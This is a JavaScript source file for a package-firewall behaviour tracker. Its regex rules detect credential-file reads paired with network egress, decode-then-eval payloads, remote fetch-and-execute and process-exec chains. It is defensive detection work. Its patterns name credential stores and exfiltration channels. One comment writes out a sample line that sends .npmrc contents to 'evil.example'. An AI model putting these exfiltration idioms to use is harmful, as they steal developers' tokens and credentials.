// packages/fw-agent/src/behavior-tracker.js
// Behavioral analyzer for sequence-based threat detection.
// Tracks dangerous action sequences within a single module.

// Signal detection patterns for each behavioral category
const SIGNAL_PATTERNS = {
  // Reads sensitive credential files (fs-based). process.env is tracked separately
  // via ENV_READ to avoid false-positive CREDENTIAL_EXFILTRATION on normal HTTP libraries.
  SENSITIVE_READ: [
    /fs\s*\.\s*readFile/,
    /fs\s*\.\s*readFileSync/,
    /fs\s*\.\s*open(?:Sync)?\s*\(/,
  ],
  // Bare environment variable access — common in normal apps; escalates to WARN only
  // unless a SENSITIVE_PATH is also present (genuine credential file access).
  ENV_READ: [
    /process\s*\.\s*env\b/,
  ],
  SENSITIVE_PATH: [
    // Match .env only as a file-path reference (preceded by quote, slash, or backtick),
    // not as a property access like `process.env.FOO` (F-16 false-positive fix).
    /['"\/`]\.env\b/i,
    /[\/\\][\w.\-]{0,40}credentials/i,
    /[\/\\]\.ssh\b/,
    /id_rsa/,
    /[\/\\]\.netrc/,
    /[\/\\]\.aws\b/,
    /[\/\\][\w.\-]{0,40}secret/i,
    /[\/\\][\w.\-]{0,40}passwd/i,
    /[\/\\][\w.\-]{0,40}shadow/i,
  ],
  // Infrastructure / browser credential stores (kubeconfig, docker registry auth, Chrome's
  // "Login Data" password DB). UNLIKE ~/.ssh or ~/.aws, these files ARE legitimately read by
  // real packages — @kubernetes/client-node reads ~/.kube/config, docker clients read
  // ~/.docker/config.json — and those libraries then make network calls to the cluster/registry.
  // So a bare "read + network egress" here is NOT proof of theft and must not hard-block, or we
  // false-positive on legit infra clients. They only become a CREDENTIAL_EXFILTRATION signal
  // when paired with a DELIBERATE exfil destination (a hardcoded non-registry host or an explicit
  // {host:...} override) — same WHERE-does-the-data-go discriminator used for .npmrc. Kept in a
  // separate list (not SENSITIVE_PATH) precisely so the stricter escalation rule applies. Closes
  // red-team exfil-docker-config / exfil-kube-config / exfil-browser-cookies without FP risk.
  SENSITIVE_CONFIG_PATH: [
    /[\/\\]\.kube[\/\\]config\b/i,
    /[\/\\]\.docker[\/\\]config\.json/i,
    /[\/\\]Login Data\b/,
  ],
  // .npmrc is its own (weaker) signal, not a SENSITIVE_PATH (F-30 redo): every npm client,
  // installer, and publish tool legitimately reads .npmrc to resolve the registry URL, so
  // bare "reads .npmrc + makes a network call" is not evidence of anything by itself. It only
  // becomes a credential-theft signal combined with an actual token-field reference, an
  // explicit host override, or a hardcoded exfil destination below -- see the escalation rule
  // in analyzeModule(). NOTE: the first cut of F-30 gated escalation solely on the literal
  // string `_authToken` appearing in the module, which missed the more common real attack --
  // reading the whole file and shipping it without ever naming the field
  // (`fetch('http://evil.example/c?d='+fs.readFileSync('.npmrc'))`). The discriminator that
  // actually holds is WHERE the data goes, not whether a field name is parsed out of it.
  NPMRC_READ: [
    /\.npmrc/i,
  ],
  // The npm auth token/password fields in a real .npmrc, e.g.
  // `//registry.npmjs.org/:_authToken=...` or `_auth=...` -- these are the actual secret,
  // as opposed to the plain `registry=` config line every package manager reads.
  NPMRC_TOKEN: [
    /_authToken/i,
    /_auth\b/i,
    /_password\b/i,
    /authToken/i,
  ],
  // Explicit destination override alongside a network call, e.g. https.request({host:
  // 'evil.example', ...}) -- a deliberate redirect, not the ambiguous case a bare hardcoded
  // URL literal can be (see HARDCODED_EGRESS_CALL).
  HOST_OPTION: [
    /host\s*:\s*['"`][^'"`]+/,
  ],
  // Makes outbound network connections
  NETWORK_EGRESS: [
    /http\s*\.\s*request\s*\(/,
    /https\s*\.\s*request\s*\(/,
    /http\s*\.\s*get\s*\(/,
    /https\s*\.\s*get\s*\(/,
    /\bfetch\s*\(/,
    /net\s*\.\s*connect\s*\(/,
    /net\s*\.\s*createConnection\s*\(/,
    /socket\s*\.\s*connect\s*\(/,
    /new\s+WebSocket\s*\(/,
    /XMLHttpRequest/,
    /tls\s*\.\s*connect\s*\(/,
    /dgram\s*\.\s*createSocket/,
    // Inline require("https").get/request — not caught by the patterns above
    /require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request)\s*\(/,
    // Inline require("net"|"tls"|"dgram").<call> — the bound forms above match `net.connect(`
    // but not the one-liner `require("net").connect(` idiom used to dodge the egress signal
    // (red-team exfil-inline-require-net). Mirrors the http/https inline pattern.
    /require\s*\(\s*['"](?:net|tls|dgram)['"]\s*\)\s*\.\s*(?:connect|createConnection|createSocket|request|get)\s*\(/,
    // Non-HTTP egress channels used to smuggle data out: DNS-tunnel (dns.resolve/resolveTxt/…,
    // NOT dns.lookup which is ubiquitous and internal) and navigator.sendBeacon. These only
    // matter as egress when combined with a credential read (CREDENTIAL_EXFILTRATION) — bare use
    // is harmless. red-team exfil-dns-tunnel / exfil-env-sendbeacon.
    /dns\s*\.\s*resolve[A-Za-z0-9]*\s*\(/,
    /navigator\s*\.\s*sendBeacon\s*\(/,
  ],
  // Generates or evaluates code at runtime
  DYNAMIC_CODE: [
    /\beval\s*\(/,
    /new\s+Function\s*\(/,
    /\bFunction\s*\(\s*['"`]/,
    /vm\s*\.\s*runIn(?:This|New|)Context\s*\(/,
    /vm\s*\.\s*Script\s*\(/,
    /\bsetTimeout\s*\(\s*['"`]/,
    /\bsetInterval\s*\(\s*['"`]/,
    /Script\s*\.\s*runInNewContext/,
    // Inline require("vm").runInThisContext/Script — the bound `vm.runInThisContext(` form is
    // matched above, but the one-liner require("vm").runInThisContext( dodges it (red-team
    // dce-inline-require-vm). Mirrors the inline-require egress pattern in NETWORK_EGRESS.
    /require\s*\(\s*['"]vm['"]\s*\)\s*\.\s*(?:runIn(?:This|New|)Context|Script)\s*\(/,
    // Indirect eval — `(0, eval)(code)` runs the string in global scope without a literal
    // `eval(` call site (red-team sc-githubusercontent-eval). The `(0,eval)` construct is a
    // deliberate idiom that does not occur in ordinary code, so this is safe as a dynamic-code
    // signal (it still only blocks when chained with egress/process-exec, never alone).
    /\(\s*0\s*,\s*eval\s*\)/,
  ],
  // Decodes an encoded blob (base64/hex) back into a string. On its own this is benign
  // (every HTTP/crypto library does it); it only matters combined with DYNAMIC_CODE — the
  // classic "decode an opaque payload, then eval it" obfuscation. Kept narrow on purpose:
  // Buffer.from must name a 'base64'/'hex' encoding (bare Buffer.from(x) is a byte copy, not
  // a decode), and atob() is the browser/base64 decoder. F-31.
  CODE_DECODE: [
    /\batob\s*\(/,
    /Buffer\s*\.\s*from\s*\([^)]*['"`](?:base64|hex)['"`]\s*\)/i,
  ],
  // Executes external processes
  PROCESS_EXEC: [
    /child_process/,
    /\bexecSync\s*\(/,
    /\bspawnSync\s*\(/,
    /\bexecFile\s*\(/,
    /\bexecFileSync\s*\(/,
    /ShellString/,
    // process.binding("spawn_sync"|"process_wrap"|"pipe_wrap") is the low-level internal path to
    // launch a process, used to dodge the child_process signal (red-team dce-process-binding).
    // Anchored to the process-spawning bindings ONLY: bare process.binding( also names benign
    // internals — lodash/sequelize use process.binding('util') for type detection — so matching
    // any binding false-positived DYNAMIC_CODE_EXEC_CHAIN alongside their Function('return this').
    /process\s*\.\s*binding\s*\(\s*['"`](?:spawn_sync|process_wrap|pipe_wrap)/i,
  ],
  // Loads modules dynamically or via non-literal paths
  DYNAMIC_REQUIRE: [
    /require\s*\.\s*resolve\s*\(/,
    /module\s*\._load\s*\(/,
    /require\s*\(\s*(?!['"`])[^)]+\)/,  // require(variable)
  ],
};

function matchesAny(content, patterns) {
  return patterns.some(p => p.test(content));
}

// A quoted absolute URL passed directly as the argument of an actual network-call site --
// distinguishes theft (hardcodes the destination) from legit npm tooling (builds the URL
// from config, e.g. `fetch(`${registry}/${name}`)`). Anchored to the call site itself (not
// "any quoted URL anywhere in the file") so a legit fallback-default constant sitting next to
// a config-driven fetch -- e.g.
// `const registry = cfg.match(...) ? m[1] : 'https://registry.npmjs.org'` -- does not
// false-positive just because that literal exists somewhere in the module. Matched against
// raw `content`, not `scanSrc`: scanSrc already strips all https?:// literals wholesale (see
// the URL-stripping replace() in analyzeModule()) so a content-based check here would never
// match if run against scanSrc. Kept outside SIGNAL_PATTERNS (and not a matchesAny() boolean
// check) because it needs its capture group -- callers that iterate SIGNAL_PATTERNS expecting
// arrays of boolean-test regexes (e.g. the registry's watch-changes.js evidence reconstruction)
// would break on a single global regex with a capture group.
const HARDCODED_EGRESS_CALL = /(?:https?\s*\.\s*(?:get|request)|fetch|net\s*\.\s*(?:connect|createConnection)|socket\s*\.\s*connect|new\s+WebSocket|tls\s*\.\s*connect|require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request))\s*\(\s*['"`](https?:\/\/[^'"`$\s]+)/g;

class BehaviorTracker {
  constructor() {
    // Per-module signal cache (filename -> signals). Shape is unchanged from the intra-file
    // era so analyzePackage() / callers that iterate it keep working.
    this.moduleSignals = new Map();
    // filename -> packageKey, used to SCOPE cross-file correlation to a single npm package.
    // The runtime firewall resets per dependency-tree root, so without scoping analyzePackage()
    // would pair signals across the whole app (a config-reading module + any http module) and
    // false-positive. The registry batch scanner resets per package and passes no key, so its
    // whole-map behavior is preserved.
    this.filePackage = new Map();
    // Accumulated violations for telemetry
    this.violations = [];
  }

  /**
   * Analyze a module and return any behavioral violations found.
   * Checks intra-module signal sequences. `packageKey` (optional) tags this file's signals so a
   * later analyzePackage(packageKey) can correlate only within the same package.
   */
  analyzeModule(filename, content, packageKey) {
    if (!content) return [];

    // SENSITIVE_PATH / SENSITIVE_READ must only fire on genuine filesystem access, not on
    // import/require module specifiers (e.g. "@memberjunction/credentials") or URL paths
    // (e.g. "https://api.example.com/totpSecret"). Blank just the specifier STRING in place
    // (never drop the whole line/statement) so chained calls on the same line survive --
    // e.g. `const s = require('fs').readFileSync('.env')` must keep the '.env' argument
    // visible to SENSITIVE_PATH after the 'fs' specifier is blanked (F-27b regression: the
    // prior line-drop approach deleted this one-line idiom entirely, producing a false
    // negative on the most common credential-theft pattern).
    //
    // Comments come first in the chain (F-28): a path-shaped string mentioned only in
    // prose (e.g. `// src/auth/credentials.ts`) previously survived into scanSrc and, next
    // to any real networkEgress call elsewhere in the module, false-positived
    // CREDENTIAL_EXFILTRATION. Block comments are blanked to a space (preserves token
    // boundaries so adjoining code doesn't fuse); line comments are dropped up to the
    // newline, guarded by a negative lookbehind on ':' so the "//" in "https://" is never
    // mistaken for a comment start and real code following a same-line URL survives.
    const scanSrc = content
      .replace(/\/\*[\s\S]*?\*\//g, ' ')             // block comments
      .replace(/(?<!:)\/\/[^\n]*/g, '')              // line comments
      .replace(/(\brequire\s*\(\s*)(['"`])(?:\\.|(?!\2)[^\\])*\2(\s*\))/g, '$1$2$2$3')  // require('spec')
      .replace(/(\bfrom\s+)(['"`])(?:\\.|(?!\2)[^\\])*\2/g, '$1$2$2')                    // import ... from 'spec'
      .replace(/(\bimport\s*\(\s*)(['"`])(?:\\.|(?!\2)[^\\])*\2(\s*\))/g, '$1$2$2$3')    // import('spec')
      .replace(/https?:\/\/[^\s'"`]+/g, '')          // URLs
      .replace(/`[^`]*\$\{[^`]*`/g, '');             // template-literal URL builders

    // Hardcoded-URL call sites, e.g. fetch('http://evil.example/...'). Extracted (not just
    // matched) so the escalation rule below can tell a hardcoded exfil host apart from a
    // hardcoded reference to the real npm registry (see hardcodedEgressNonRegistry).
    const hardcodedEgressUrls = [];
    for (const m of content.matchAll(HARDCODED_EGRESS_CALL)) {
      hardcodedEgressUrls.push(m[1]);
    }

    const signals = {
      sensitiveRead: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_READ),
      sensitivePath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_PATH),
      sensitiveConfigPath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_CONFIG_PATH),
      npmrcRead: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_READ),
      npmrcToken: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_TOKEN),
      hostOption: matchesAny(content, SIGNAL_PATTERNS.HOST_OPTION),
      hardcodedEgress: hardcodedEgressUrls.length > 0,
      hardcodedEgressNonRegistry: hardcodedEgressUrls.some(u => !/^https?:\/\/registry\.npmjs\.org\b/i.test(u)),
      envRead: matchesAny(content, SIGNAL_PATTERNS.ENV_READ),
      networkEgress: matchesAny(content, SIGNAL_PATTERNS.NETWORK_EGRESS),
      dynamicCode: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_CODE),
      // Matched against scanSrc (comments/URLs/specifiers stripped) so a decode call named
      // only in a comment cannot manufacture the OBFUSCATED_CODE_EXECUTION signal. F-31.
      codeDecode: matchesAny(scanSrc, SIGNAL_PATTERNS.CODE_DECODE),
      processExec: matchesAny(content, SIGNAL_PATTERNS.PROCESS_EXEC),
      dynamicRequire: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_REQUIRE),
    };

    this.moduleSignals.set(filename, signals);
    if (packageKey !== undefined && packageKey !== null) this.filePackage.set(filename, packageKey);

    const found = [];

    // Intra-module rule: credential file read OR sensitive path + network egress → CRITICAL exfiltration.
    // Bare process.env reads are intentionally excluded here (F-16: false-positive on axios, dotenv, etc.)
    // and handled by the ENV_NETWORK_EGRESS WARN rule below.
    if (signals.sensitivePath && signals.networkEgress) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION',
        severity: 'CRITICAL',
        description: 'Module reads sensitive credentials and makes network calls',
      });
    }

    // Intra-module rule: .npmrc read + network egress. CRITICAL when there's a concrete
    // theft signal -- an actual token/password field reference, an explicit host override, or
    // a hardcoded destination that isn't the real npm registry. A hardcoded call-site URL that
    // IS registry.npmjs.org (some legit tools hardcode it instead of building it from config)
    // is downgraded to WARN rather than blocked, same as the config-built-URL case -- the
    // registry host itself isn't a theft signal, only an unusual one.
    if (signals.npmrcRead && signals.networkEgress) {
      if (signals.npmrcToken || signals.hostOption || signals.hardcodedEgressNonRegistry) {
        found.push({
          rule: 'CREDENTIAL_EXFILTRATION',
          severity: 'CRITICAL',
          description: 'Module reads .npmrc and exfiltrates its contents, an auth token, or redirects to a hardcoded/overridden destination',
        });
      } else {
        found.push({
          rule: 'NPMRC_NETWORK_EGRESS',
          severity: 'WARN',
          description: 'Module reads .npmrc and makes network calls (common in npm tooling; monitor for token extraction or a hardcoded exfil destination)',
        });
      }
    }

    // Intra-module rule: infra/browser credential store read + network egress WITH a deliberate
    // exfil destination → CRITICAL. The destination gate (hardcoded non-registry host or explicit
    // {host:...} override) is what separates theft from legitimate k8s/docker/browser tooling,
    // which reads these files and connects to a config-derived (not hardcoded-attacker) endpoint.
    if (signals.sensitiveConfigPath && signals.networkEgress &&
        (signals.hardcodedEgressNonRegistry || signals.hostOption)) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION',
        severity: 'CRITICAL',
        description: 'Module reads an infrastructure/browser credential store and sends it to a hardcoded or overridden destination',
      });
    }

    // Intra-module rule: bare env read + network egress → WARN only (common in normal apps).
    // Escalates to CRITICAL only if a sensitive credential path is also detected (handled above).
    if (signals.envRead && signals.networkEgress && !signals.sensitiveRead && !signals.sensitivePath) {
      found.push({
        rule: 'ENV_NETWORK_EGRESS',
        severity: 'WARN',
        description: 'Module reads process.env and makes network calls (common pattern; monitor for credential paths)',
      });
    }

    // Intra-module rule: dynamic code generation + process execution → code injection chain
    if (signals.dynamicCode && signals.processExec) {
      found.push({
        rule: 'DYNAMIC_CODE_EXEC_CHAIN',
        severity: 'CRITICAL',
        description: 'Module generates code dynamically and executes system processes',
      });
    }

    // Intra-module rule: decode an encoded blob + evaluate it as code → the classic
    // "unpack an opaque payload, then eval/Function it" obfuscation (F-31). Bare eval and
    // Buffer.from are WARN-only (F-20 — both appear in legitimate build tools), so neither
    // primitive blocks alone; it's the *decode-then-execute* combination that is the strong
    // malicious signal. HIGH → hard block in index.js (detector.js escalates HIGH to a
    // non-warnOnly block detection). This closes the base64→eval gap where a comment-free
    // `Buffer.from(b64,'base64').toString(); eval(x)` previously fell through as OBSERVE.
    if (signals.dynamicCode && signals.codeDecode) {
      found.push({
        rule: 'OBFUSCATED_CODE_EXECUTION',
        severity: 'HIGH',
        description: 'Module decodes an encoded blob (base64/hex) and evaluates it as code',
      });
    }

    // Intra-module rule: network egress + dynamic code generation → fetch-and-execute. The
    // "download a second stage from a remote host and eval/new Function it" pattern (red-team
    // sc-fetch-eval-generic-host / sc-githubusercontent-eval / sc-transfer-sh /
    // sc-s3-remote-config-eval). Both signals are required and neither blocks alone (bare eval is
    // WARN-only per F-20; bare fetch is benign), so this only fires when a module both reaches the
    // network AND evaluates code — a combination that is implausible in reputable packages.
    // HIGH → hard block. Kept below CREDENTIAL_EXFILTRATION/OBFUSCATED so a payload that already
    // matched a more specific rule is not double-reported here (dedup is not required, but the
    // ordering keeps the most descriptive rule first).
    if (signals.networkEgress && signals.dynamicCode) {
      found.push({
        rule: 'REMOTE_FETCH_EXEC',
        severity: 'HIGH',
        description: 'Module makes a network request and evaluates code at runtime (remote fetch-and-execute)',
      });
    }

    // Standalone rule: dynamic require with non-literal path → module injection risk
    if (signals.dynamicRequire) {
      found.push({
        rule: 'DYNAMIC_MODULE_LOAD',
        severity: 'MEDIUM',
        description: 'Module uses dynamic require() or module._load with a non-literal path',
      });
    }

    if (found.length > 0) {
      this.violations.push({ filename, violations: found, timestamp: Date.now() });
    }

    return found;
  }

  /**
   * Cross-file correlation: analyzeModule() only ever sees one file's content, so a package that
   * splits a credential read into file A and the exfiltrating network call into file B (or the
   * dynamic-code / process-exec chain, same idea) never has both signals present in any single
   * analyzeModule() call and evades every intra-module rule above. This re-applies the same
   * combination rules across every file's cached signals, pairing signals that land in two
   * DIFFERENT files (same-file combinations are already caught intra-module).
   *
   * SCOPING: when `packageKey` is passed, only files tagged with that key are correlated — this
   * is how the runtime firewall keeps cross-file bounded to one npm package instead of the whole
   * dependency tree (see filePackage). With no key it correlates the whole map, which is the
   * registry batch-scanner contract (it resets() per package, so the whole map IS one package).
   * Callers in either mode MUST reset() between packages.
   *
   * NB (deviation from the original registry rule, carried back on sync): the credential pairing
   * keys on `sensitivePath` (a genuine credential path), NOT bare `sensitiveRead` (any
   * fs.readFile). The looser form false-positived on ordinary multi-file packages that read a
   * template/asset in one file and make an HTTP call in another. This matches the intra-file
   * rule's strictness.
   */
  analyzePackage(packageKey) {
    let entries = [...this.moduleSignals.entries()];
    if (packageKey !== undefined && packageKey !== null) {
      entries = entries.filter(([f]) => this.filePackage.get(f) === packageKey);
    }
    const found = [];
    if (entries.length < 2) return found;

    const filesWhere = (pred) => entries.filter(([, s]) => pred(s)).map(([f]) => f);
    // Strip to basenames in descriptions so scanner-host temp paths never leak; pairing itself
    // stays on full paths (two distinct files can share a basename).
    const base = f => String(f).split(/[\\/]/).pop();
    const crossPair = (as, bs) => {
      for (const a of as) for (const b of bs) if (a !== b) return [base(a), base(b)];
      return null;
    };

    const credFiles = filesWhere(s => s.sensitivePath);
    const npmrcTokenFiles = filesWhere(s => s.npmrcRead && (s.npmrcToken || s.hostOption || s.hardcodedEgressNonRegistry));
    const egressFiles = filesWhere(s => s.networkEgress);
    const dynamicCodeFiles = filesWhere(s => s.dynamicCode);
    const processExecFiles = filesWhere(s => s.processExec);

    const credPair = crossPair(credFiles, egressFiles);
    if (credPair) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package reads sensitive credentials in ${credPair[0]} and makes network calls in ${credPair[1]} -- split across files to evade per-file scanning`,
        files: credPair,
      });
    }

    const npmrcPair = crossPair(npmrcTokenFiles, egressFiles);
    if (npmrcPair) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package reads .npmrc credentials in ${npmrcPair[0]} and makes network calls in ${npmrcPair[1]} -- split across files to evade per-file scanning`,
        files: npmrcPair,
      });
    }

    const execPair = crossPair(dynamicCodeFiles, processExecFiles);
    if (execPair) {
      found.push({
        rule: 'DYNAMIC_CODE_EXEC_CHAIN_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package generates code dynamically in ${execPair[0]} and executes system processes in ${execPair[1]} -- split across files to evade per-file scanning`,
        files: execPair,
      });
    }

    if (found.length > 0) {
      this.violations.push({ filename: '<package>', violations: found, timestamp: Date.now() });
    }

    return found;
  }

  reset() {
    this.moduleSignals.clear();
    this.filePackage.clear();
    this.violations = [];
  }
}

module.exports = { BehaviorTracker };
